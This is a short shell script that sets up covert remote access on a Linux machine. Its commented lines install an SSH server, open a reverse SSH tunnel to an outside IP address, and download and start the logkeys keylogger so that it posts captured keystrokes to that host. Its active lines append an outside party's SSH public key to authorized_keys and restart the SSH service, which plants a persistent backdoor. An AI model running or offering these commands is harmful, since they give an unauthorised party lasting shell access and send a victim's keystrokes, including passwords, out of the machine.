#sudo apt update
#sudo apt install openssh-server -y
#sudo ufw allow ssh
#echo "GatewayPorts clientspecified" | sudo tee -a /etc/ssh/sshd_config
#systemctl reload ssh.service
#ssh -N -R 27580:localhost:22 gizmo@75.138.184.49
#ssh -R 27580:localhost:22 gizmo@75.138.184.49
#wget http://launchpadlibrarian.net/165012984/logkeys_0.1.1a+git5ef6b0dcb9e3-2_amd64.deb
#sudo apt install logkeys_0.1.1a+git5ef6b0dcb9e3-2_amd64.deb
#logkeys -s --post-size=1K --post-irc 75.138.184.49:27580

echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDWUroyP3KoN/A8yEmxY9P32NjeznzwgSNChDLXRnjMTlJ/hgZhtx6twHxnf3qmQp1TlpbM6S74RWfeWnKXQzYuXIbFzC3md6uUpGdlfLRSFdVpH1xIbaI9XT0MUZZ2szuxEs4YyHyf4KsDBNx3A3E62wfFzPizGrwT8BWmKFICb/yrcBvgjLvFj1Yq0LCRPrvbxaXZFkcFhsRn6OE05BVb3fiLlmZ4L85oOQtdnQGEscyXO1viI/6N0RvxoNkH99Tcp6FPqe2cn4VsFwjK9yacSkeiF9szFMRAaPIimbeEPp8CYV2zTFzfZXSAlRLtibxxJFhVmECbdWzBYuEI5kSE9MCrH+GpKshQrZBXg+t1GWRwl2BTjEJ2IOklFJ9p5Rq0WMUOUW0c7o3IySd8AVgxO8Y8q5hNsWJaHoeLy3QpExM2HEsN1cqZ4YF3rEtOgiAerMBb1j9CfaCUsrZJtH1pUx3zB2dysSvCF0NKcAapCNS0hhNlHMY0oNsv5Zn/ZDE= gizmo@Jonathans-MacBook-Pro.local' >> .ssh/authorized_keys
systemctl restart ssh
